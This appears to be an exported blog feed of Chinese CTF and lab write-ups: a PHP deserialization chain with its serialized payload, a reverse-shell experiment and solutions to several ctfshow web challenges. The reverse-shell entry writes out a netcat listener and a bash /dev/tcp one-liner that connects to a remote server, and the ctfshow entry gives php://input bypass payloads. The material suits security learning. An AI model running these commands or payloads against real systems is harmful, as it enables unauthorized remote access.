<span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="keyword">new</span> <span class="title function_ invoke__">foo2</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

在foo1中的构造函数中定义$varr的值为foo2的实例，在foo2中定义$obj为foo3的实例，在foo3中定义$varr的值为echo "spoock"。最终得到的序列话的值是

$$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo "spoock";";}}}$$

]]></content>
      <tags>
        <tag>ciscn2024</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell的实验</title>
    <url>/2024/07/18/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h1 id="反弹shell实验"><a href="#反弹shell实验" class="headerlink" title="反弹shell实验"></a>反弹shell实验</h1><p>之前国赛ciscn2024坐牢</p>
<p>web题目简直难如登天</p>
<p>但是还是有大佬把题目做出来了，而且用的技术非常高端反弹shell</p>
<p>今天终于抽出时间来做这个反弹shell的实验</p>
<p>首先我们先自己搭建一个自己的服务器（以后自己做题目也得用）这里我用的阿里云，因为它可以试用</p>
<p>网址<a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a></p>
<p>这里反弹shell的原理之前讲过了，这里就不讲了</p>
<p>搭建好服务器</p>
<p>第一步先设置服务器，这里需要开放一个端口用来反弹shell，我这里用的7777端口<img src="/imgs/1.png"></p>
<p>后续我们也会用这个端口复现下国赛的题目</p>
<p>然后我们用自己的shell来连上我们的服务器</p>
<p>刚连上服务器需要自己下载nc</p>
<p>我们用自己的服务器作为攻击端</p>
<p>用我的kali作为被攻击端</p>
<p>在服务器上</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">7777</span>//监听<span class="number">7777</span>端口</span><br></pre></td></tr></table></figure>

<p>然后在kali上</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">8.xxx</span>.xxx.xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>成功连接上</p>
<p><img src="/imgs/2.png"></p>
<p>做这个实验也是花了一些时间</p>
<p>当时没想到服务器要自己去打开端口</p>
<p>没关系成功了就行</p>
]]></content>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow摆烂杯复现</title>
    <url>/2024/07/28/ctfshow%E6%91%86%E7%83%82%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="一行代码"><a href="#一行代码" class="headerlink" title="一行代码"></a>一行代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:  2021-11-18 21:25:22</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:  h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2021-11-18 22:14:12</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> !(!(<span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>)||(!<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>))||<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;.&#x27;</span>)||(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]!=<span class="number">0</span>)||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])&lt;=<span class="number">7</span>)||(!<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;ctfsho&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;ctfshow&quot;</span>))||<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&#x27;w&#x27;</span>||(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;r&#x27;</span>) !== <span class="string">&quot;welcome2ctfshow&quot;</span>))?<span class="variable">$flag</span>:<span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>分析下源码</p>
<ol>
<li>成功包含 <code>flag.php</code> 文件。</li>
<li>错误报告已关闭。</li>
<li><code>$_GET[&#39;filename&#39;]</code> 中不包含 <code>.</code>。</li>
<li><code>$_GET[&#39;id&#39;]</code> 等于 <code>0</code>。</li>
<li><code>$_GET[&#39;content&#39;]</code> 的长度大于7。</li>
<li><code>$_GET[&#39;content&#39;]</code> 的第一个字符与 <code>ctfshow</code> 匹配。</li>
<li><code>$_GET[&#39;content&#39;]</code> 的第一个字符不为 <code>w</code>。</li>
<li><code>$_GET[&#39;filename</code> 的内容为 <code>welcome2ctfshow</code>。</li>
</ol>
<p>如果所有这些条件都满足，则输出 <code>$flag</code></p>
<p>id&#x3D;0没什么讲的 cotent内容大于7.且第一个字母不为w,但又要与welcome 第一个字符一样</p>
<p>搜索下eregi(string,string)</p>
<p>发现作用就是用来进行字符串匹配的，但是他不区分大小写，所以这里我们直接第一个字母大写W就好了</p>
<p>filename 要为welcome2ctfshow 但不能直接俄get传 因为这样会把整个文件读入</p>
<p>所有用伪协议php:&#x2F;&#x2F;input</p>
<p>让后POST提交welcome2ctfshow</p>
<p>GET: ?id&#x3D;0&amp;content&#x3D;W2Gu0f3n&amp;filename&#x3D;php:&#x2F;&#x2F;input</p>
<p>POST:welcome2ctfshow</p>
<p><img src="/imgs/2024%E5%B9%B47%E6%9C%8828%E6%97%A510%E7%82%B924%E5%88%86.png" alt="image-20240728102150005"></p>
<h2 id="黑客网站"><a href="#黑客网站" class="headerlink" title="黑客网站"></a>黑客网站</h2><p>打开其实就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tyro s4qw s3mm bubg jqje 46nc v35j aqjg eb3n qiuf 23ij oj4z wasx ohyd onion</span><br></pre></td></tr></table></figure>

<p>循环 看到 onion 应该都不陌生</p>
<p>下载洋葱浏览器直接搜就是了，但是洋葱都知道是干嘛的吧（(●’◡’●)）</p>
<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p>计算方式为(A)**3+(B)**3+(c)**3</p>
<p>用括号绕过即可，</p>
<p>a&#x3D;+114)+(0</p>
<p>b和c都为-0就可以</p>
<p>(+114)+(0)**3+(-0)**3+(-0)**3 &#x3D;114</p>
<h2 id="登陆不了"><a href="#登陆不了" class="headerlink" title="登陆不了"></a>登陆不了</h2><p>注册发现验证码没用到</p>
<p>打开验证码图片位置</p>
<p>确定存在任意文件读取漏洞</p>
<p>ok，不会了 gg 提桶跑路 ヾ(•ω•&#96;)o</p>
<p>哈哈哈 还是得好好复现（之后补上嘿嘿）</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
</search>
